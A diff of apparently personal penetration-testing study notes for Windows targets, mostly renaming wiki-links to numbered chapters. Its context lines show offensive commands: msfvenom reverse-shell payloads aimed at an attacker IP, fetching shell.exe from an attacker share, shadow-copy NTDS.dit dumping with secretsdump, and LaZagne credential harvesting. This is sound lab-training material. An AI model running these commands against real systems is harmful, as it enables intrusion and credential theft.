@@ -21,7 +21,7 @@ nmap -sT -p- --min-rate 5000 --max-retries 1 -oA nmap_full <target>
 - NetBIOS (137-139)
 
 #### Step 1b: Vulnerability Scanning
-> Full walkthrough (Nessus install/scan/analysis, Nmap NSE vuln scripts): [[Vulnerability Scanning]]
+> Full walkthrough (Nessus install/scan/analysis, Nmap NSE vuln scripts): [[07. Vulnerability Scanning|Vulnerability Scanning]]
 
 ```bash
 sudo nmap -sV -p <port> --script "vuln" <target>
@@ -44,7 +44,7 @@ nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 <target>
 - SMB vulnerabilities (EternalBlue, SMBGhost)
 
 #### Step 3: Web Enumeration
-> Full walkthrough (Nmap web fingerprinting, Wappalyzer, Gobuster incl. API pattern brute force, Burp Suite Proxy/Repeater/Intruder, XSS): [[Introduction to Web Application Attacks]], same techniques as [[Linux Methodology#Step 2: Web Application Enumeration|Linux Methodology's Step 2]], IIS/ASP.NET just changes the extensions and a couple of default paths.
+> Full walkthrough (Nmap web fingerprinting, Wappalyzer, Gobuster incl. API pattern brute force, Burp Suite Proxy/Repeater/Intruder, XSS): [[08. Introduction to Web Application Attacks|Introduction to Web Application Attacks]], same techniques as [[Linux Methodology#Step 2: Web Application Enumeration|Linux Methodology's Step 2]], IIS/ASP.NET just changes the extensions and a couple of default paths.
 
 ```bash
 nmap -p80 -sV <target>
@@ -84,7 +84,7 @@ dism /online /Enable-Feature /FeatureName:TelnetClient
 telnet <target> 25
 VRFY <username>
 ```
-*Full explanation and worked examples for all four of these: [[Information Gathering#6.4.1. DNS Enumeration|6.4.1]] (nslookup), [[Information Gathering#6.4.3. Port Scanning with Nmap|6.4.3]] (the PowerShell port sweep, mechanics broken down in [[Reconnaissance & Enumeration (Breakdowns)#PowerShell TcpClient inline port sweep (no Nmap on target)|Command Breakdowns]]), [[Information Gathering#6.4.5. SMTP Enumeration|6.4.5]] (Telnet VRFY).*
+*Full explanation and worked examples for all four of these: [[06. Information Gathering#6.4.1. DNS Enumeration|6.4.1]] (nslookup), [[06. Information Gathering#6.4.3. Port Scanning with Nmap|6.4.3]] (the PowerShell port sweep, mechanics broken down in [[Reconnaissance & Enumeration (Breakdowns)#PowerShell TcpClient inline port sweep (no Nmap on target)|Command Breakdowns]]), [[06. Information Gathering#6.4.5. SMTP Enumeration|6.4.5]] (Telnet VRFY).*
 
 ---
 
@@ -105,7 +105,7 @@ searchsploit <software> <version>
 ```
 
 #### Step 1a: Fixing a Public Buffer Overflow Exploit
-> Full walkthrough (theory, cross-compiling, return-address verification, offset bugs, SEH mechanics): [[Fixing Exploits]]
+> Full walkthrough (theory, cross-compiling, return-address verification, offset bugs, SEH mechanics): [[14. Fixing Exploits|Fixing Exploits]]
 
 ```bash
 # Exploit source includes winsock2.h/windows.h? Written to compile ON Windows, cross-compile from Kali instead
@@ -125,7 +125,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread \
 - EIP holds a rotated/shifted version of the expected value → offset miscalculation, not a wrong return address (check `strcpy`/`strcat` null-terminator handling)
 - Target crashes/stops responding right after an exploit attempt with no listener running → likely the correct overwrite path, just an uncaught shell. Reset the VM, get the listener up **first**, retry
 
-Full syntax: [[Fixing Exploits#Cross-Compiling with mingw-w64|Command Appendix]], [[Buffer Overflow & Memory Corruption#msfvenom: Generating Shellcode for a BOF Payload|Command Appendix]]. Troubleshooting: [[Fixing Exploits (Decision Tree)|Decision Tree]], [[Buffer Overflow & Memory Corruption (Decision Tree)|Decision Tree]].
+Full syntax: [[14. Fixing Exploits#Cross-Compiling with mingw-w64|Command Appendix]], [[Buffer Overflow & Memory Corruption#msfvenom: Generating Shellcode for a BOF Payload|Command Appendix]]. Troubleshooting: [[Fixing Exploits (Decision Tree)|Decision Tree]], [[Buffer Overflow & Memory Corruption (Decision Tree)|Decision Tree]].
 
 #### Tags: #FixingExploits #BufferOverflow #MingwW64 #Wine #SEHOverflow
 
@@ -133,7 +133,7 @@ Full syntax: [[Fixing Exploits#Cross-Compiling with mingw-w64|Command Appendix]]
 
 #### Step 1b: Client-Side Delivery (Macros / Library Files)
 
-For internal-only targets with nothing exposed to attack directly, get a user to run something instead. See [[Client-Side Attacks#12.2. Exploiting Microsoft Office|12.2]] (Office macros) and [[Client-Side Attacks#12.3. Abusing Windows Library Files|12.3]] (Windows library files + `.lnk`).
+For internal-only targets with nothing exposed to attack directly, get a user to run something instead. See [[12. Client-Side Attacks#12.2. Exploiting Microsoft Office|12.2]] (Office macros) and [[12. Client-Side Attacks#12.3. Abusing Windows Library Files|12.3]] (Windows library files + `.lnk`).
 
 **Office macro (VBA), scoped to the document itself, not Normal.dotm:**
 ```vba
@@ -174,7 +174,7 @@ See [[Client-Side Attacks (Decision Tree)|Decision Tree]] for troubleshooting bo
 ---
 
 #### Step 1c: Phishing (Credential Capture)
-> Full walkthrough (pretext research, website cloning, clone-patching, credential capture): [[Phishing Basics]]
+> Full walkthrough (pretext research, website cloning, clone-patching, credential capture): [[11. Phishing Basics|Phishing Basics]]
 
 *The technique itself (clone a login page, patch the interactive bits, stand up a capture server, deliver via a researched pretext) is genuinely OS-agnostic, it targets the person, not their machine's OS, so it sits here as the initial-foothold-by-social-engineering counterpart to Step 1b's client-side delivery above rather than as a Windows-specific technique.*
 
@@ -215,7 +215,7 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -
 
 #### Step 2b: AV Evasion (When AV Is Blocking Direct Payloads)
 
-> Full walkthrough (VirusTotal detection, in-memory PowerShell injection, Shellter PE injection, .bat wrappers, FTP delivery): [[Antivirus Evasion]]
+> Full walkthrough (VirusTotal detection, in-memory PowerShell injection, Shellter PE injection, .bat wrappers, FTP delivery): [[15. Antivirus Evasion|Antivirus Evasion]]
 
 When a raw `.exe` gets flagged, try these in order of least setup required:
 
@@ -272,7 +272,7 @@ copy \\<attacker_ip>\share\shell.exe shell.exe
 
 ### Phase 2.5: Password Attacks & Lateral Movement
 
-> Full walkthrough (Hydra, Hashcat, Mimikatz, Responder, ntlmrelayx, Credential Guard bypass): [[Password Attacks]]
+> Full walkthrough (Hydra, Hashcat, Mimikatz, Responder, ntlmrelayx, Credential Guard bypass): [[16. Password Attacks|Password Attacks]]
 
 #### Step 1: Service Brute Force / Spraying (before or without a shell)
 
@@ -473,7 +473,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYS
 ```
 Then exfil + crack: `impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL`
 
-Full reference: [[Password Attacks (HTB Supplementary)#PA.8 SAM Offline Dump via reg.exe + smbserver|PA.8]], [[Password Attacks (HTB Supplementary)#PA.9 pypykatz lsa minidump|PA.9]], [[Password Attacks (HTB Supplementary)#PA.13 NTDS.dit via Volume Shadow Copy|PA.13]].
+Full reference: [[16. Password Attacks|PA.8]], [[16. Password Attacks|PA.9]], [[16. Password Attacks|PA.13]].
 
 #### Tags: #SAM #LSASS #pypykatz #NetExec #NTDS #VSS #OfflineDump #HTBSupplementary
 
@@ -510,7 +510,7 @@ Get-ChildItem C:\Users\ -Recurse -ErrorAction SilentlyContinue | Select-String "
 .\lazagne.exe browsers   :: browser passwords only
 ```
 
-Full reference: [[Password Attacks (HTB Supplementary)#PA.11 Windows Credential Manager (cmdkey + runas /savecred)|PA.11]], [[Password Attacks (HTB Supplementary)#PA.12 LaZagne|PA.12]].
+Full reference: [[16. Password Attacks|PA.11]], [[16. Password Attacks|PA.12]].
 
 #### Tags: #CredentialHunting #cmdkey #LaZagne #findstr #PSReadLine #HTBSupplementary
 
@@ -518,7 +518,7 @@ Full reference: [[Password Attacks (HTB Supplementary)#PA.11 Windows Credential 
 
 ### Phase 3: Privilege Escalation
 
-> Full technique details + lab walkthroughs: [[Windows Privilege Escalation]]. Quick command lookup: [[Windows Privilege Escalation (Command Appendix)]]. "I found X, what do I try": [[Windows Privilege Escalation (Decision Tree)]].
+> Full technique details + lab walkthroughs: [[17. Windows Privilege Escalation|Windows Privilege Escalation]]. Quick command lookup: [[Windows Privilege Escalation]]. "I found X, what do I try": [[Windows Privilege Escalation (Decision Tree)]].
 
 #### Step 1: Situational Awareness
 ```cmd
